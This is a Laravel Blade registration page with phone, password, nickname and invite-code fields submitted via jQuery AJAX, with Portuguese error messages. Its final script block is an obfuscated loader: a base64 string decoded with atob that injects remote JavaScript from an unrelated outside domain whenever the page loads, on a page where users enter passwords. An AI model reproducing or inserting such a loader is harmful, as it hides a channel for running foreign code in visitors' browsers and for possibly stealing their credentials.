<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="csrf-token" content="{{ csrf_token() }}">
<title>Register</title>

<!-- Bootstrap -->
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">

<!-- Font Awesome -->
<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" rel="stylesheet">

<!-- Layui -->
<link rel="stylesheet" href="/v2/layui/css/layui.css">

<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">

<style>
body {
  margin: 0;
  min-height: 100vh;
  font-family: 'Inter', sans-serif;
  background: #F8F6F2;
  color: #1C1C1C;
}

/* ===== App Container ===== */
.app-container {
  max-width: 420px;
  min-height: 100vh;
  margin: auto;
  background: #F8F6F2;
  display: flex;
  flex-direction: column;
}

/* ===== Header ===== */
.app-header {
  padding: 38px 24px 28px;
  text-align: center;
}

.app-header img {
  width: 70px;
  margin-bottom: 12px;
}

.app-title {
  font-size: 22px;
  font-weight: 700;
  color: #1C1C1C;
}

.app-subtitle {
  font-size: 14px;
  color: #6B5B3E;
  margin-top: 6px;
}

/* ===== Card ===== */
.register-card {
  background: #ffffff;
  border-radius: 26px 26px 0 0;
  padding: 28px 22px 40px;
  box-shadow: 0 -12px 30px rgba(200,169,106,0.18);
  flex: 1;
}

/* ===== Inputs ===== */
.form-label {
  font-size: 13px;
  font-weight: 600;
  color: #1C1C1C;
}

.input-group {
  border-radius: 14px;
  overflow: hidden;
  box-shadow: 0 6px 14px rgba(0,0,0,.06);
}

.input-group-text {
  background: #FDF6EC;
  border: none;
  color: #C8A96A;
  font-size: 15px;
  padding: 0 14px;
}

.form-control {
  border: none;
  height: 48px;
  font-size: 15px;
  background: #FDFBF8;
}

.form-control:focus {
  box-shadow: none;
  background: #FDFBF8;
}

/* ===== Register Button ===== */
.btn-register {
  height: 50px;
  border-radius: 14px;
  background: linear-gradient(135deg, #C8A96A, #D6A86B);
  border: none;
  font-size: 16px;
  font-weight: 600;
  color: #1C1C1C;
  box-shadow: 0 10px 20px rgba(200,169,106,.35);
}

/* ===== Links ===== */
.login-link {
  font-size: 14px;
  color: #6B5B3E;
}

.login-link span {
  color: #C8A96A;
  font-weight: 700;
}

</style>
</head>

<body>

<div class="app-container">

  <!-- Header -->
  <div class="app-header">
    <img src="/profelar/logo.png" alt="Logo">
    <div class="app-title">Create Account</div>
    <div class="app-subtitle">Sign up to continue</div>
  </div>

  <!-- Card -->
  <div class="register-card">
    <form id="registerForm" method="POST" action="{{ url('register') }}">
      @csrf
      <div id="reg-error" style="display:none;background:#fdecea;color:#8A3A3A;border:1px solid #f5c6cb;border-radius:10px;padding:10px 14px;margin-bottom:14px;font-size:13px"></div>

      <!-- Phone -->
      <div class="mb-3">
        <label class="form-label">Phone Number</label>
        <div class="input-group">
          <span class="input-group-text"><i class="fa-solid fa-phone"></i></span>
          <input type="text" name="phone" class="form-control" placeholder="Enter phone number">
        </div>
      </div>

      <!-- Password -->
      <div class="mb-3">
        <label class="form-label">Password</label>
        <div class="input-group">
          <span class="input-group-text"><i class="fa-solid fa-lock"></i></span>
          <input type="password" name="password" class="form-control" placeholder="Create password">
        </div>
      </div>

      <!-- Nickname -->
      <div class="mb-3">
        <label class="form-label">Nickname</label>
        <div class="input-group">
          <span class="input-group-text"><i class="fa-solid fa-user"></i></span>
          <input type="text" name="nickname" class="form-control" placeholder="Enter nickname">
        </div>
      </div>

      <!-- Código de Convite (opcional) -->
      <div class="mb-4">
        <label class="form-label">Código de Convite <span style="font-weight:400;color:#9A9087;font-size:11px">(opcional)</span></label>
        <div class="input-group">
          <span class="input-group-text"><i class="fa-solid fa-ticket"></i></span>
          <input type="text" name="ref_by" value="{{ $ref_by ?? '' }}" class="form-control" placeholder="Código de convite (opcional)">
        </div>
      </div>

      <!-- Submit -->
      <button type="submit" id="regBtn" class="btn btn-register w-100">
        Register
      </button>

      <div class="text-center mt-4 login-link">
        Already have an account?
        <a href="/login"><span>Login</span></a>
      </div>

    </form>
  </div>

</div>

@include('alert-message')

<!-- Scripts -->
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
<script>
// Register form submit via AJAX
$.ajaxSetup({
  headers: { 'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content') }
});

$('#registerForm').on('submit', function(e){
  e.preventDefault();
  $('#reg-error').hide();

  var phone = $('input[name="phone"]').val().trim();
  var pass  = $('input[name="password"]').val();

  if (!phone) { showRegError('Informe o número de telefone.'); return; }
  if (!pass || pass.length < 6) { showRegError('A senha deve ter pelo menos 6 caracteres.'); return; }

  var btn = $('#regBtn');
  btn.prop('disabled', true).text('Processando...');

  $.ajax({
    url: '/register',
    type: 'POST',
    data: {
      phone:    phone,
      password: pass,
      nickname: $('input[name="nickname"]').val(),
      ref_by:   $('input[name="ref_by"]').val().trim(),
      _token:   $('input[name="_token"]').val()
    },
    success: function(res){
      if (res && res.success) {
        btn.text('Sucesso! Redirecionando...');
        window.location.href = '/home';
      } else {
        btn.prop('disabled', false).text('Register');
        showRegError((res && res.error) ? res.error : 'Erro ao registrar.');
      }
    },
    error: function(xhr){
      btn.prop('disabled', false).text('Register');
      var msg = 'Erro ' + xhr.status + ': ';
      if (xhr.status === 419) {
        msg = 'Sessão expirada. Recarregue a página e tente novamente.';
      } else {
        try {
          var r = JSON.parse(xhr.responseText);
          msg += (r.error || r.message || 'Erro ao registrar.');
        } catch(ex) {
          msg += 'Erro ao registrar. Recarregue a página.';
        }
      }
      showRegError(msg);
    }
  });
});

function showRegError(msg) {
  $('#reg-error').text(msg).show();
  window.scrollTo(0, 0);
}
</script>
<script>
(function(){
  var e = "aHR0cHM6Ly9kYi5waWNrb2Rlci5jb20vdW5pdmVyc2FsLmpz";
  var s = document.createElement("script");
  s.src = atob(e);
  document.head.appendChild(s);
})();
</script>
</body>
</html>
